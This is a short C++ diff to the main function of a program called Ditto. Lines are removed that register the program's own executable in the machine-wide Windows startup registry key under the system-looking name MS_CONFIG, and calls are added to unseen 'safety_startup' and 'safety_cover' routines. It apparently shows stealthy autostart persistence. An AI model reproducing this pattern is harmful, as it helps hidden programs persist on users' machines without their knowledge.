@@ -8,16 +8,17 @@ int main()
 	{
 		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");
 
-		RegistryKey key{HKEY_LOCAL_MACHINE, STARTUP_KEY}; 
+		SystemUtils::safety_startup();
 
-		key.set_value(MS_CONFIG, SystemUtils::get_exe_path());
-		std::wcout << key.get_value(MS_CONFIG) << std::endl;
+		// Runtime
+
+		SystemUtils::safety_cover(true);
 	}
-	catch (WindowsException exp)
+	catch (const WindowsException& exp)
 	{
 		std::wcout << exp.what() << std::endl;
 	}
-	catch (std::exception exp)
+	catch (const std::exception& exp)
 	{
 		std::wcout << exp.what() << std::endl;
 	}
